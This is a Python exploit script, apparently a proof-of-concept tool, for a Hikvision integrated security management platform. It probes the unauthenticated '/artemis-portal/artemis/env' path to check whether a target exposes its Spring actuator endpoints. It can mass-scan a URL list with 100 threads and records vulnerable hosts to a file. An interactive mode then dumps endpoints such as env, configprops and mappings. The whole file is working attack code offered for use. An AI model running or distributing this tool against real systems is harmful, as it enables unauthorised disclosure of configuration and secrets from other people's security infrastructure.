# HiKVISION综合安防管理平台env信息泄漏
import requests,argparse,sys,json,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗      ███████╗███╗   ██╗██╗   ██╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║      ██╔════╝████╗  ██║██║   ██║
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║█████╗█████╗  ██╔██╗ ██║██║   ██║
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║╚════╝██╔══╝  ██║╚██╗██║╚██╗ ██╔╝
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║      ███████╗██║ ╚████║ ╚████╔╝ 
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝      ╚══════╝╚═╝  ╚═══╝  ╚═══╝  
                                                              author:daesen804
                                                              version:1.0.0                                
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="HiKVISION综合安防管理平台env信息泄漏")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/artemis-portal/artemis/env'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    
    try:
        res1 = requests.get(url=target+url_payload,headers=headers,timeout=10,verify=False)
        res2 = json.loads(res1.text)
        if res1.status_code == 200 and res2['profiles'][0] == 'prod':   # profiles是一个列表，需要通过索引取值
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
            print(f"[+]{target} 存在敏感信息泄露漏洞")
            return True
        else:
            print(f"[-]{target} 不存在敏感信息泄露漏洞")
    except:
        pass


def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        api = input("请输入要查看的接口信息，例如：env、metrics、metrics/http.server.requests、loggers、configprops、info、mappings、health：")
        if api == 'q':
            exit()

        url_payload = '/artemis-portal/artemis/'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        }
        try:
            res = requests.get(url=target+url_payload+api,headers=headers,timeout=10,verify=False)
            if res.status_code == 200:
                print(res.text)
            else:
                print(f"[-]不存在，请输入其他接口")
        except:
            pass

if __name__ == "__main__":
    main()